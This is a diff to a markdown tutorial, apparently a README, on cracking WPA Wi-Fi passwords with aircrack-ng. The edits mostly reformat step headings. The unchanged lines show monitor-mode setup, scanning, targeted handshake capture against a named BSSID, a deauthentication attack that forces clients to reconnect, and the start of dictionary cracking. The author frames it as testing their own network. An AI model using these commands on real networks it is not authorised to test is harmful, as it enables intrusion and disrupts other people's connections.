@@ -34,7 +34,7 @@ Edit
 
 ```
 
-🛑 STEP 2: Stop Monitor Mode (to start fresh)
+## 🛑 STEP 2: Stop Monitor Mode (to start fresh)
 ```bash
 sudo airmon-ng stop wlan0mon
 ```
@@ -50,7 +50,7 @@ phy0    wlan0mon        rtl8xxxu        Realtek Semiconductor Corp. RTL8188FTV 8
                 (mac80211 monitor mode vif disabled for [phy0]wlan0mon)
 ```
 
-🚀 STEP 3: Start Monitor Mode
+## 🚀 STEP 3: Start Monitor Mode
 ```bash
 sudo airmon-ng start wlan0
 ```
@@ -65,7 +65,7 @@ phy0    wlan0mon        rtl8xxxu        Realtek Semiconductor Corp. RTL8188FTV 8
                 (mac80211 monitor mode vif disabled for [phy0]wlan0mon)
 ```
 
-📡 STEP 4: Scan for Nearby Wi-Fi Networks
+## 📡 STEP 4: Scan for Nearby Wi-Fi Networks
 ```bash
 sudo airodump-ng wlan0mon
 ```
@@ -90,7 +90,7 @@ CH (Channel) → The Wi-Fi channel number it's broadcasting on: 11
 ESSID → The name of the network: Ankith
 ```
 
-🎯 STEP 5: Lock onto the target and capture the handshake
+## 🎯 STEP 5: Lock onto the target and capture the handshake
 ```bash
 sudo airodump-ng -c 11 --bssid 3E:B7:E4:DD:3A:19 -w ankith_capture wlan0mon
 ```
@@ -100,7 +100,7 @@ Keep running until you see:
 WPA handshake: 3E:B7:E4:DD:3A:19
 ```
 
-### 💥 Trigger the Handshake (Deauth Attack)
+## 💥 Trigger the Handshake (Deauth Attack)
 
 If no client is connecting or the handshake is taking too long, we can force a device to reconnect by sending deauthentication packets.
 ```bash
@@ -121,7 +121,8 @@ wlan0mon → Monitor mode interface
 This sends 5 deauthentication frames to all clients connected to Ankith.
 Those clients will disconnect and auto-reconnect, triggering a WPA handshake.
 
-📱 Simple Trick
+## 📱 Simple Trick
+
 Take your phone near the laptop or PC, turn Wi-Fi off, then turn it on again.
 When the respective Wi-Fi appears on the phone, click on it.
 WPA handshake: 3E:B7:E4:DD:3A:19 will appear on your terminal.
@@ -138,7 +139,7 @@ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probe
 
 ```
 
-🧾 STEP 7: Open and Visualize the Handshake in Wireshark
+## 🧾 STEP 7: Open and Visualize the Handshake in Wireshark
 ```bash
 wireshark ankith_capture-01.cap
 ```
@@ -185,7 +186,7 @@ Message	Flags
 
 💡 You only need Message 2 to crack with Aircrack-ng.
 
-🔓 STEP 9: Crack the Handshake
+## 🔓 STEP 9: Crack the Handshake
 You’ll need a wordlist (dictionary of possible passwords).
 In this case, Since it was my own Wifi, I suspected a few potential passwords and created a file including those.
 
